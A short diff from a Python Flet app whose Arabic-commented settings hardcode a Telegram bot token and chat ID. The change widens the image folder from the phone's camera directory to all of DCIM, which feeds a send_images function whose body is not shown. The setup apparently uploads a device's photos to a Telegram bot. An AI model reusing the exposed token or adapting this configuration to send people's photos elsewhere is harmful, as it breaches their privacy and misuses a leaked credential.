@@ -5,11 +5,10 @@ import threading
 import time
 import flet as ft
 
-
 # إعداد بيانات بوت تيليجرام - قم بتعديلها بما يتناسب مع بياناتك
 TOKEN = "7259492835:AAEJhhqbEzTOj0Q7vZj6YOK0PmwRHYqaroM"   # ضع هنا رمز التوكن الخاص بك
 CHAT_ID = "6486770497"              # ضع هنا معرف الدردشة (رقمي أو نصي)
-IMAGE_DIR = "/storage/emulated/0/DCIM/Camera"  # عدل المسار حسب بيئتك
+IMAGE_DIR = "/storage/emulated/0/DCIM/"  # عدل المسار حسب بيئتك
 
 def send_images(page: ft.Page, progress_bar: ft.ProgressBar, status_text: ft.Text):
     """
